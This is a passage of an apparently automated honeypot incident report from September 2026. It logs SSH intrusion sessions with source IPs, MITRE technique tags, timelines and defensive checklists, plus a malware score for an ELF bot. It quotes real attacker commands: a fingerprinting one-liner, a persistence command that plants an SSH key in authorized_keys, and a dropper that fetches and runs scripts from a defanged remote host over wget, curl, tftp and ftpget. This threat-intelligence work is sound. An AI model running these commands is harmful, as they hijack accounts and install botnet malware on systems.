| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:45:23` | `cowrie.session.connect` |
| `2026-09-29 01:45:23` | `cowrie.client.version` |
| `2026-09-29 01:45:23` | `cowrie.client.kex` |
| `2026-09-29 01:45:24` | `cowrie.login.success` |
| `2026-09-29 01:45:25` | `cowrie.session.params` |
| `2026-09-29 01:45:25` | `cowrie.command.input` |
| `2026-09-29 01:45:25` | `cowrie.command.input` |
| `2026-09-29 01:45:25` | `cowrie.command.input` |
| `2026-09-29 01:45:25` | `cowrie.command.input` |
| `2026-09-29 01:45:25` | `cowrie.command.input` |
| `2026-09-29 01:45:25` | `cowrie.command.success` |
| `2026-09-29 01:45:25` | `cowrie.command.input` |
| `2026-09-29 01:45:25` | `cowrie.command.input` |
| `2026-09-29 01:45:25` | `cowrie.command.input` |
| `2026-09-29 01:45:25` | `cowrie.command.input` |
| `2026-09-29 01:45:25` | `cowrie.log.closed` |
| `2026-09-29 01:45:26` | `cowrie.session.params` |
| `2026-09-29 01:45:26` | `cowrie.command.input` |
| `2026-09-29 01:45:27` | `cowrie.log.closed` |
| `2026-09-29 01:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40847963ad12

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:46 |
| **Last Seen** | 2026-09-29 01:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:46:50` | `cowrie.session.connect` |
| `2026-09-29 01:46:50` | `cowrie.client.version` |
| `2026-09-29 01:46:50` | `cowrie.client.kex` |
| `2026-09-29 01:46:51` | `cowrie.login.success` |
| `2026-09-29 01:46:52` | `cowrie.session.params` |
| `2026-09-29 01:46:52` | `cowrie.command.input` |
| `2026-09-29 01:46:52` | `cowrie.command.input` |
| `2026-09-29 01:46:52` | `cowrie.command.input` |
| `2026-09-29 01:46:52` | `cowrie.command.input` |
| `2026-09-29 01:46:52` | `cowrie.command.input` |
| `2026-09-29 01:46:52` | `cowrie.command.success` |
| `2026-09-29 01:46:52` | `cowrie.command.input` |
| `2026-09-29 01:46:52` | `cowrie.command.input` |
| `2026-09-29 01:46:52` | `cowrie.command.input` |
| `2026-09-29 01:46:52` | `cowrie.command.input` |
| `2026-09-29 01:46:52` | `cowrie.log.closed` |
| `2026-09-29 01:46:53` | `cowrie.session.params` |
| `2026-09-29 01:46:53` | `cowrie.command.input` |
| `2026-09-29 01:46:54` | `cowrie.log.closed` |
| `2026-09-29 01:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34d637b0d8d7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:48 |
| **Last Seen** | 2026-09-29 01:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:48:15` | `cowrie.session.connect` |
| `2026-09-29 01:48:15` | `cowrie.client.version` |
| `2026-09-29 01:48:15` | `cowrie.client.kex` |
| `2026-09-29 01:48:16` | `cowrie.login.success` |
| `2026-09-29 01:48:17` | `cowrie.session.params` |
| `2026-09-29 01:48:17` | `cowrie.command.input` |
| `2026-09-29 01:48:17` | `cowrie.command.input` |
| `2026-09-29 01:48:17` | `cowrie.command.input` |
| `2026-09-29 01:48:17` | `cowrie.command.input` |
| `2026-09-29 01:48:17` | `cowrie.command.input` |
| `2026-09-29 01:48:17` | `cowrie.command.success` |
| `2026-09-29 01:48:17` | `cowrie.command.input` |
| `2026-09-29 01:48:17` | `cowrie.command.input` |
| `2026-09-29 01:48:17` | `cowrie.command.input` |
| `2026-09-29 01:48:17` | `cowrie.command.input` |
| `2026-09-29 01:48:18` | `cowrie.log.closed` |
| `2026-09-29 01:48:19` | `cowrie.session.params` |
| `2026-09-29 01:48:19` | `cowrie.command.input` |
| `2026-09-29 01:48:19` | `cowrie.log.closed` |
| `2026-09-29 01:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3351773f3ab4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:49 |
| **Last Seen** | 2026-09-29 01:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:49:39` | `cowrie.session.connect` |
| `2026-09-29 01:49:39` | `cowrie.client.version` |
| `2026-09-29 01:49:39` | `cowrie.client.kex` |
| `2026-09-29 01:49:40` | `cowrie.login.success` |
| `2026-09-29 01:49:41` | `cowrie.session.params` |
| `2026-09-29 01:49:41` | `cowrie.command.input` |
| `2026-09-29 01:49:41` | `cowrie.command.input` |
| `2026-09-29 01:49:41` | `cowrie.command.input` |
| `2026-09-29 01:49:41` | `cowrie.command.input` |
| `2026-09-29 01:49:41` | `cowrie.command.input` |
| `2026-09-29 01:49:41` | `cowrie.command.success` |
| `2026-09-29 01:49:41` | `cowrie.command.input` |
| `2026-09-29 01:49:41` | `cowrie.command.input` |
| `2026-09-29 01:49:41` | `cowrie.command.input` |
| `2026-09-29 01:49:41` | `cowrie.command.input` |
| `2026-09-29 01:49:42` | `cowrie.log.closed` |
| `2026-09-29 01:49:42` | `cowrie.session.params` |
| `2026-09-29 01:49:42` | `cowrie.command.input` |
| `2026-09-29 01:49:43` | `cowrie.log.closed` |
| `2026-09-29 01:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b632338c30b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-09-29 01:51 |
| **Last Seen** | 2026-09-29 01:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:51:23` | `cowrie.session.connect` |
| `2026-09-29 01:51:23` | `cowrie.client.version` |
| `2026-09-29 01:51:23` | `cowrie.client.kex` |
| `2026-09-29 01:51:24` | `cowrie.login.success` |
| `2026-09-29 01:51:25` | `cowrie.session.params` |
| `2026-09-29 01:51:25` | `cowrie.command.input` |
| `2026-09-29 01:51:25` | `cowrie.command.failed` |
| `2026-09-29 01:51:25` | `cowrie.log.closed` |
| `2026-09-29 01:51:26` | `cowrie.session.params` |
| `2026-09-29 01:51:26` | `cowrie.command.input` |
| `2026-09-29 01:51:26` | `cowrie.session.file_download` |
| `2026-09-29 01:51:26` | `cowrie.log.closed` |
| `2026-09-29 01:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2af5532b74d5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-09-29 01:51 |
| **Last Seen** | 2026-09-29 01:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:51:26` | `cowrie.session.connect` |
| `2026-09-29 01:51:26` | `cowrie.client.version` |
| `2026-09-29 01:51:26` | `cowrie.client.kex` |
| `2026-09-29 01:51:27` | `cowrie.login.success` |
| `2026-09-29 01:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5511173859c3

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-09-29 01:51 |
| **Last Seen** | 2026-09-29 01:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:51:28` | `cowrie.session.connect` |
| `2026-09-29 01:51:28` | `cowrie.client.version` |
| `2026-09-29 01:51:28` | `cowrie.client.kex` |
| `2026-09-29 01:51:28` | `cowrie.login.success` |
| `2026-09-29 01:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-141c4780802a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-29 01:53 |
| **Last Seen** | 2026-09-29 01:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh;curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh;busybox wget hxxp://213.232.114[.]14/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114[.]14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114[.]14 ftp1.sh ftp1.sh;sh ftp1.sh;rm -rf handshakebins.sh tftp1.sh` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:53:29` | `cowrie.session.connect` |
| `2026-09-29 01:53:29` | `cowrie.client.version` |
| `2026-09-29 01:53:29` | `cowrie.client.kex` |
| `2026-09-29 01:53:30` | `cowrie.login.success` |
| `2026-09-29 01:53:31` | `cowrie.session.params` |
| `2026-09-29 01:53:31` | `cowrie.command.input` |
| `2026-09-29 01:53:35` | `cowrie.session.file_download` |
| `2026-09-29 01:53:36` | `cowrie.session.file_download` |
| `2026-09-29 01:53:36` | `cowrie.session.file_download` |
| `2026-09-29 01:53:36` | `cowrie.session.file_download` |
| `2026-09-29 01:53:36` | `cowrie.session.file_download.failed` |
| `2026-09-29 01:53:40` | `cowrie.session.file_download` |
| `2026-09-29 01:53:40` | `cowrie.session.file_download` |
| `2026-09-29 01:53:41` | `cowrie.log.closed` |
| `2026-09-29 01:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee44cb558a93

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-29 01:53 |
| **Last Seen** | 2026-09-29 01:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh;curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh;busybox wget hxxp://213.232.114[.]14/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114[.]14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114[.]14 ftp1.sh ftp1.sh;sh ftp1.sh;rm -rf handshakebins.sh tftp1.sh` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:53:39` | `cowrie.session.connect` |
| `2026-09-29 01:53:39` | `cowrie.client.version` |
| `2026-09-29 01:53:39` | `cowrie.client.kex` |
| `2026-09-29 01:53:40` | `cowrie.login.success` |
| `2026-09-29 01:53:41` | `cowrie.session.params` |
| `2026-09-29 01:53:41` | `cowrie.command.input` |
| `2026-09-29 01:53:41` | `cowrie.session.file_download` |
| `2026-09-29 01:53:51` | `cowrie.log.closed` |
| `2026-09-29 01:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfbfedb1369f

| Field | Detail |
|---|---|
| **Source IP** | `138.197.195[.]44` |
| **First Seen** | 2026-09-29 01:54 |
| **Last Seen** | 2026-09-29 01:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:54:41` | `cowrie.session.connect` |
| `2026-09-29 01:54:41` | `cowrie.client.version` |
| `2026-09-29 01:54:41` | `cowrie.client.kex` |
| `2026-09-29 01:54:41` | `cowrie.login.success` |
| `2026-09-29 01:54:42` | `cowrie.session.params` |
| `2026-09-29 01:54:42` | `cowrie.command.input` |
| `2026-09-29 01:54:42` | `cowrie.command.failed` |
| `2026-09-29 01:54:42` | `cowrie.log.closed` |
| `2026-09-29 01:54:43` | `cowrie.session.params` |
| `2026-09-29 01:54:43` | `cowrie.command.input` |
| `2026-09-29 01:54:43` | `cowrie.session.file_download` |
| `2026-09-29 01:54:43` | `cowrie.log.closed` |
| `2026-09-29 01:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.195[.]44` to AbuseIPDB if not already reported
- [ ] Block `138.197.195[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53e90fae845b

| Field | Detail |
|---|---|
| **Source IP** | `138.197.195[.]44` |
| **First Seen** | 2026-09-29 01:54 |
| **Last Seen** | 2026-09-29 01:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:54:43` | `cowrie.session.connect` |
| `2026-09-29 01:54:43` | `cowrie.client.version` |
| `2026-09-29 01:54:43` | `cowrie.client.kex` |
| `2026-09-29 01:54:43` | `cowrie.login.success` |
| `2026-09-29 01:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.195[.]44` to AbuseIPDB if not already reported
- [ ] Block `138.197.195[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4bcd4bc3b9

| Field | Detail |
|---|---|
| **Source IP** | `138.197.195[.]44` |
| **First Seen** | 2026-09-29 01:54 |
| **Last Seen** | 2026-09-29 01:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:54:43` | `cowrie.session.connect` |
| `2026-09-29 01:54:43` | `cowrie.client.version` |
| `2026-09-29 01:54:43` | `cowrie.client.kex` |
| `2026-09-29 01:54:44` | `cowrie.login.success` |
| `2026-09-29 01:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.195[.]44` to AbuseIPDB if not already reported
- [ ] Block `138.197.195[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9334e1a64bf9

| Field | Detail |
|---|---|
| **Source IP** | `193.187.110[.]214` |
| **First Seen** | 2026-09-29 02:02 |
| **Last Seen** | 2026-09-29 02:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:02:45` | `cowrie.session.connect` |
| `2026-09-29 02:02:45` | `cowrie.client.version` |
| `2026-09-29 02:02:45` | `cowrie.client.kex` |
| `2026-09-29 02:02:46` | `cowrie.login.success` |
| `2026-09-29 02:02:46` | `cowrie.direct-tcpip.request` |
| `2026-09-29 02:02:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-29 02:02:46` | `cowrie.direct-tcpip.data` |
| `2026-09-29 02:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.187.110[.]214` to AbuseIPDB if not already reported
- [ ] Block `193.187.110[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96029a525061

| Field | Detail |
|---|---|
| **Source IP** | `34.140.24[.]228` |
| **First Seen** | 2026-09-29 02:16 |
| **Last Seen** | 2026-09-29 02:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:16:39` | `cowrie.session.connect` |
| `2026-09-29 02:16:40` | `cowrie.client.version` |
| `2026-09-29 02:16:40` | `cowrie.client.kex` |
| `2026-09-29 02:16:45` | `cowrie.login.success` |
| `2026-09-29 02:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `34.140.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8da8e1c0a72a

| Field | Detail |
|---|---|
| **Source IP** | `156.225.14[.]74` |
| **First Seen** | 2026-09-29 02:17 |
| **Last Seen** | 2026-09-29 02:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:17:03` | `cowrie.session.connect` |
| `2026-09-29 02:17:03` | `cowrie.client.version` |
| `2026-09-29 02:17:03` | `cowrie.client.kex` |
| `2026-09-29 02:17:04` | `cowrie.login.success` |
| `2026-09-29 02:17:05` | `cowrie.session.params` |
| `2026-09-29 02:17:05` | `cowrie.command.input` |
| `2026-09-29 02:17:05` | `cowrie.command.failed` |
| `2026-09-29 02:17:06` | `cowrie.log.closed` |
| `2026-09-29 02:17:06` | `cowrie.session.params` |
| `2026-09-29 02:17:06` | `cowrie.command.input` |
| `2026-09-29 02:17:07` | `cowrie.session.file_download` |
| `2026-09-29 02:17:07` | `cowrie.log.closed` |
| `2026-09-29 02:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.14[.]74` to AbuseIPDB if not already reported
- [ ] Block `156.225.14[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca0f3ca4ac2

| Field | Detail |
|---|---|
| **Source IP** | `156.225.14[.]74` |
| **First Seen** | 2026-09-29 02:17 |
| **Last Seen** | 2026-09-29 02:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:17:07` | `cowrie.session.connect` |
| `2026-09-29 02:17:07` | `cowrie.client.version` |
| `2026-09-29 02:17:07` | `cowrie.client.kex` |
| `2026-09-29 02:17:08` | `cowrie.login.success` |
| `2026-09-29 02:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.14[.]74` to AbuseIPDB if not already reported
- [ ] Block `156.225.14[.]74` at perimeter firewall / security group
